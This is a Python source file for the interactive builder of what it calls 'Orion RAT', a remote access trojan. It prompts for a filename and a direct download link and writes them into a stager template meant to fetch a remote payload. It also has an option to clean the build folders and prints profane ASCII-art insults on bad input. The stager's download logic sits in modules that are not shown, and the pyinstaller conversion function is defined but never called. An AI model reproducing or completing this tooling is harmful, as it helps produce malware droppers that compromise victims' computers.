import requests
from funcs2 import stagebase, cleaner, clear, pyinstall
import os
import colorama
from colorama import Fore, Back
import time
from time import sleep
def repeat():
    clear.clr()
    user=os.getlogin()
    ascii =  Fore.LIGHTYELLOW_EX+ r"""
                                ________        .__                __________    ________________
                                \_____  \_______|__| ____   ____   \______   \  /  _  \__    ___/
                                 /   |   \_  __ \  |/  _ \ /    \   |       _/ /  /_\  \|    |   
                                /    |    \  | \/  (  <_> )   |  \  |    |   \/    |    \    |   
                                \_______  /__|  |__|\____/|___|  /  |____|_  /\____|__  /____|   
                                        \/                     \/          \/         \/         
    """
    print(ascii+f"""
                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}1{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Build the stager\n                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}2{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Clean all folders\n{Fore.WHITE}""")
    chs = int(input(f'''                                ┌[{Fore.LIGHTYELLOW_EX}{user}{Fore.WHITE}★{Fore.LIGHTYELLOW_EX}builder{Fore.WHITE}]
                                └{Fore.GREEN}$ {Fore.WHITE}'''))

    def opt1():
        clear.clr()
        ascii = Fore.LIGHTYELLOW_EX+r"""
                                ________        .__                __________      .__.__       .___
                                \_____  \_______|__| ____   ____   \______   \__ __|__|  |    __| _/___________
                                 /   |   \_  __ \  |/  _ \ /    \   |    |  _/  |  \  |  |   / __ |/ __ \_  __ \
                                /    |    \  | \/  (  <_> )   |  \  |    |   \  |  /  |  |__/ /_/ \  ___/|  | \/
                                \_______  /__|  |__|\____/|___|  /  |______  /____/|__|____/\____ |\___  >__|
                                        \/                     \/          \/                    \/    \/     
"""
        print(ascii)
        print(f"                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}!{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Double-check URL if it is really downloadable{Fore.WHITE}\n")
        flnm=input(f'                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}-{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Choose the filename of the stager executable:{Fore.WHITE} ')
        stagebase.rebuildstagerbase(flnm2=flnm)
        rl=input(f"                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}-{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Copy the direct download link:{Fore.WHITE} ")

        def changeurl():
            try:
                with open(f'fnlstager/{flnm}.py', 'r') as fli:
                    lines = fli.readlines() 
                lines[8]  = f'        gurl = "{rl}"\n'
                lines[9] = f'        gname = "{flnm}"\n'
                with open(f'fnlstager/{flnm}.py', 'w') as filewrite:
                    filewrite.writelines(lines)
                time.sleep(0.3)
                print(f"                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}!{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Succesfully updated file.{Fore.WHITE}")
            except Exception as e:
                time.sleep(0.3)
                print(f"                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}!{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Couldnt update stager file, reason:{Fore.WHITE} {e}")
        changeurl()
        def pyinstaller():
            pyinstall.convert(filename=f"fnlstager/{flnm}")
        time.sleep(2)
        repeat()
    def opt2():
        clear.clr()
        ascii = Fore.LIGHTYELLOW_EX+r"""
                                ________        .__                _________ .__                                     
                                \_____  \_______|__| ____   ____   \_   ___ \|  |   ____ _____    ____   ___________ 
                                 /   |   \_  __ \  |/  _ \ /    \  /    \  \/|  | _/ __ \\__  \  /    \_/ __ \_  __ \
                                /    |    \  | \/  (  <_> )   |  \ \     \___|  |_\  ___/ / __ \|   |  \  ___/|  | \/
                                \_______  /__|  |__|\____/|___|  /  \______  /____/\___  >____  /___|  /\___  >__|   
                                        \/                     \/          \/          \/     \/     \/     \/       
"""
        print(ascii)
        print(f'                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}-{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} Cleaning down folders..')
        try:
            cleaner.clean()
        except FileNotFoundError:
            print(f'                                {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}!{Fore.WHITE}]{Fore.LIGHTYELLOW_EX} No files found in directory!')


        sleep(2)
        repeat()

    if chs == 1:
        opt1()
        time.sleep(2)
    elif chs == 2:
        opt2()
        time.sleep(2)

    elif chs != 1 or 2:
        clear.clr()
        fuckyou="""
                                FFFFFFFFFFFFFFFFFFFFFF                                      kkkkkkkk                YYYYYYY       YYYYYYY                                
                                F::::::::::::::::::::F                                      k::::::k                Y:::::Y       Y:::::Y                                
                                F::::::::::::::::::::F                                      k::::::k                Y:::::Y       Y:::::Y                                
                                FF::::::FFFFFFFFF::::F                                      k::::::k                Y::::::Y     Y::::::Y                                
                                  F:::::F       FFFFFFuuuuuu    uuuuuu      cccccccccccccccc k:::::k    kkkkkkk     YYY:::::Y   Y:::::YYYooooooooooo   uuuuuu    uuuuuu  
                                  F:::::F             u::::u    u::::u    cc:::::::::::::::c k:::::k   k:::::k         Y:::::Y Y:::::Y oo:::::::::::oo u::::u    u::::u  
                                  F::::::FFFFFFFFFF   u::::u    u::::u   c:::::::::::::::::c k:::::k  k:::::k           Y:::::Y:::::Y o:::::::::::::::ou::::u    u::::u  
                                  F:::::::::::::::F   u::::u    u::::u  c:::::::cccccc:::::c k:::::k k:::::k             Y:::::::::Y  o:::::ooooo:::::ou::::u    u::::u  
                                  F:::::::::::::::F   u::::u    u::::u  c::::::c     ccccccc k::::::k:::::k               Y:::::::Y   o::::o     o::::ou::::u    u::::u  
                                  F::::::FFFFFFFFFF   u::::u    u::::u  c:::::c              k:::::::::::k                 Y:::::Y    o::::o     o::::ou::::u    u::::u  
                                  F:::::F             u::::u    u::::u  c:::::c              k:::::::::::k                 Y:::::Y    o::::o     o::::ou::::u    u::::u  
                                  F:::::F             u:::::uuuu:::::u  c::::::c     ccccccc k::::::k:::::k                Y:::::Y    o::::o     o::::ou:::::uuuu:::::u  
                                FF:::::::FF           u:::::::::::::::uuc:::::::cccccc:::::ck::::::k k:::::k               Y:::::Y    o:::::ooooo:::::ou:::::::::::::::uu
                                F::::::::FF            u:::::::::::::::u c:::::::::::::::::ck::::::k  k:::::k           YYYY:::::YYYY o:::::::::::::::o u:::::::::::::::u
                                F::::::::FF             uu::::::::uu:::u  cc:::::::::::::::ck::::::k   k:::::k          Y:::::::::::Y  oo:::::::::::oo   uu::::::::uu:::u
                                FFFFFFFFFFF               uuuuuuuu  uuuu    cccccccccccccccckkkkkkkk    kkkkkkk         YYYYYYYYYYYYY    ooooooooooo       uuuuuuuu  uuuu

                                Not an option, dumb shit.
                                """
        print(fuckyou)
        time.sleep(2)
        repeat()

try: 
    repeat()

except KeyboardInterrupt:
    print('      Quitting..')
except ValueError:
        clear.clr()
        fuckyou="""
                                FFFFFFFFFFFFFFFFFFFFFF                                      kkkkkkkk                YYYYYYY       YYYYYYY                                
                                F::::::::::::::::::::F                                      k::::::k                Y:::::Y       Y:::::Y                                
                                F::::::::::::::::::::F                                      k::::::k                Y:::::Y       Y:::::Y                                
                                FF::::::FFFFFFFFF::::F                                      k::::::k                Y::::::Y     Y::::::Y                                
                                  F:::::F       FFFFFFuuuuuu    uuuuuu      cccccccccccccccc k:::::k    kkkkkkk     YYY:::::Y   Y:::::YYYooooooooooo   uuuuuu    uuuuuu  
                                  F:::::F             u::::u    u::::u    cc:::::::::::::::c k:::::k   k:::::k         Y:::::Y Y:::::Y oo:::::::::::oo u::::u    u::::u  
                                  F::::::FFFFFFFFFF   u::::u    u::::u   c:::::::::::::::::c k:::::k  k:::::k           Y:::::Y:::::Y o:::::::::::::::ou::::u    u::::u  
                                  F:::::::::::::::F   u::::u    u::::u  c:::::::cccccc:::::c k:::::k k:::::k             Y:::::::::Y  o:::::ooooo:::::ou::::u    u::::u  
                                  F:::::::::::::::F   u::::u    u::::u  c::::::c     ccccccc k::::::k:::::k               Y:::::::Y   o::::o     o::::ou::::u    u::::u  
                                  F::::::FFFFFFFFFF   u::::u    u::::u  c:::::c              k:::::::::::k                 Y:::::Y    o::::o     o::::ou::::u    u::::u  
                                  F:::::F             u::::u    u::::u  c:::::c              k:::::::::::k                 Y:::::Y    o::::o     o::::ou::::u    u::::u  
                                  F:::::F             u:::::uuuu:::::u  c::::::c     ccccccc k::::::k:::::k                Y:::::Y    o::::o     o::::ou:::::uuuu:::::u  
                                FF:::::::FF           u:::::::::::::::uuc:::::::cccccc:::::ck::::::k k:::::k               Y:::::Y    o:::::ooooo:::::ou:::::::::::::::uu
                                F::::::::FF            u:::::::::::::::u c:::::::::::::::::ck::::::k  k:::::k           YYYY:::::YYYY o:::::::::::::::o u:::::::::::::::u
                                F::::::::FF             uu::::::::uu:::u  cc:::::::::::::::ck::::::k   k:::::k          Y:::::::::::Y  oo:::::::::::oo   uu::::::::uu:::u
                                FFFFFFFFFFF               uuuuuuuu  uuuu    cccccccccccccccckkkkkkkk    kkkkkkk         YYYYYYYYYYYYY    ooooooooooo       uuuuuuuu  uuuu

                                Not an number, dumb shit.
                                """
        print(fuckyou)
        time.sleep(2)
        repeat()